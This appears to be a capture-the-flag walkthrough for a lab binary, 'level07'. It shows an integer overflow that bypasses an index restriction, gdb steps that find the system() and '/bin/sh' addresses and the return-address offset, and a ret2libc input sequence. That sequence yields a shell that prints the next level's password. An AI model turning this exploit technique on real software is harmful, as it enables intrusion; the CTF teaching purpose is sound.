# Walkthrough level07

In this binary we don't have function to get the flag.  
We need to get a shell by our own.

With the function `store_number` we can write a number in an index.  
The only restriction on the index is `index % 3 != 0`.  
We can avoid this restriction with int overflow:

```bash
Input command: store
 Number: 42
 Index: 0
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
```

To overflow we can use this formula `(2^32 + index) / 4`:

```bash
Input command: store
 Number: 42
 Index: 1073741824
 Completed store command successfully
Input command: read
 Index: 0
 Number at data[0] is 42
 Completed read command successfully
```

Because it's boring to write a lots, we don't use shellcode but [ret2libc](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc).

We need address of system, `/bin/sh` and offset of eip:

```bash
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p 0xf7e6aed0
$2 = 4159090384

(gdb) find __libc_start_main,+99999999,"/bin/sh"
0xf7f897ec
(gdb) x/s 0xf7f897ec
0xf7f897ec:      "/bin/sh"
(gdb) p 0xf7f897ec
$3 = 4160264172
```

- address of `system` = 4159090384
- address of `/bin/sh` = 4160264172

Find the offset of eip:

```bash
(gdb) i f
Stack level 0, frame at 0xffffd710:
 eip = 0x8048857 in main; saved eip 0xf7e45513
 Arglist at 0xffffd708, args: 
 Locals at 0xffffd708, Previous frame's sp is 0xffffd710
 Saved registers:
  ebx at 0xffffd6fc, ebp at 0xffffd708, esi at 0xffffd700, edi at 0xffffd704,
  eip at 0xffffd70c

(gdb) x/xw $esp + 0x24
0xffffd544:     0x00000000

(gdb) p (0xffffd70c - 0xffffd544) / 4
$6 = 114
```

Offset of `eip` = 114

`114 % 3 == 0` so we need to overflow: 1073741824 + 114 = 1073741938

```bash
Input command: store
 Number: 4159090384
 Index: 1073741938 ()
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
